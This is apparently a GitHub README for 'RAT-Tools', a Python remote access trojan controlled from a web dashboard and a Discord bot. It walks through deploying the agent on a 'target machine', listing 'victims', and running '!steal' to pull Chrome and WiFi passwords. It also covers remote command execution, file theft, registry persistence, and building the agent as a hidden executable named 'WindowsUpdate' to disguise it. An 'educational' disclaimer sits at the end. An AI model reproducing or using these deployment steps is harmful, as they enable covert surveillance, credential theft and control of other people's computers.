
```markdown
# RAT-Tools

Remote Administration Tool - Command & Control Center for Educational Purposes

## Features

- Remote command execution on target systems
- Screenshot capture and retrieval
- Password extraction (Chrome, WiFi credentials)
- File management (browse, download, upload)
- Discord bot integration for remote control
- Web-based dashboard interface
- Native Windows desktop application
- Automatic screenshot capture
- Registry persistence mechanism

## Requirements

- Python 3.11 or higher
- Windows 10/11 (client)
- Discord account (optional)

## Installation

### Server Setup

```bash
git clone https://github.com/ahmouy/RAT-Tools.git
cd RAT-Tools/server
pip install -r requirements.txt
python app.py
```

### Client Setup (Target Machine)

```bash
cd RAT-Tools/client
pip install pillow mss requests
python agent.py
```

## Configuration

Create `.env` file in server directory:

```env
DISCORD_TOKEN=your_bot_token_here
CHANNEL_ID=your_channel_id_here
SECRET_KEY=your_secret_key_here
```

### Discord Bot Setup

1. Visit Discord Developer Portal
2. Create new application
3. Navigate to Bot section
4. Add bot and copy token
5. Enable all Privileged Intents
6. Invite bot to your server using: `https://discord.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&permissions=8&scope=bot`

## Commands

### Discord Commands

| Command | Description |
|---------|-------------|
| `!victims` | List connected targets |
| `!exec <ID> <command>` | Execute system command |
| `!screenshot <ID>` | Capture screenshot |
| `!steal <ID>` | Extract passwords |
| `!ls <ID> <path>` | List directory contents |
| `!download <ID> <path>` | Download file from target |
| `!commands` | Show all commands |

### Web Interface

Access `http://localhost:5000` after starting the server.

Tabs available:
- OUTPUT: Command execution results
- SCREENSHOTS: Captured screenshots
- PASSWORDS: Extracted credentials
- FILES: Downloaded files

### Desktop Application

Run the desktop app for native Windows interface:

```bash
python desktop_app.py
```

## Build Executable

### Build Agent

```bash
cd client
pip install pyinstaller
pyinstaller --onefile --noconsole --name=WindowsUpdate agent.py
```

### Build Desktop Application

```bash
pip install pyinstaller
pyinstaller --onefile --windowed --name=RAT_Tools desktop_app.py
```

## Project Structure

```
RAT-Tools/
├── server/
│   ├── app.py
│   ├── templates/
│   │   └── index.html
│   ├── database.db
│   └── requirements.txt
├── client/
│   ├── agent.py
│   └── build.bat
├── desktop_app.py
├── .env
└── README.md
```

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/victims` | GET | List victims |
| `/api/register` | POST | Register victim |
| `/api/send_command` | POST | Queue command |
| `/api/poll/<id>` | GET | Poll commands |
| `/api/result` | POST | Submit result |
| `/api/upload_screenshot` | POST | Upload screenshot |
| `/api/passwords/<id>` | GET | Get passwords |
| `/api/commands/<id>` | GET | Get command history |

## Requirements.txt

```
flask>=2.0.0
flask-cors>=3.0.0
discord.py>=2.0.0
python-dotenv>=1.0.0
requests>=2.25.0
pillow>=9.0.0
mss>=6.0.0
opencv-python>=4.5.0
pyinstaller>=5.0.0
```

## Troubleshooting

### Agent not connecting
- Check if server is running on port 5000
- Verify IP address in agent.py
- Check firewall settings

### Discord bot not responding
- Verify token in .env file
- Check Privileged Intents are enabled
- Ensure bot has proper permissions

### Screenshots not saving
- Install mss and pillow: `pip install mss pillow`
- Check write permissions

## Disclaimer

This tool is developed for educational and security research purposes only. Users are responsible for complying with local laws and regulations. Unauthorized access to computer systems is illegal.

## Author

ahmouy

## License

MIT License
```

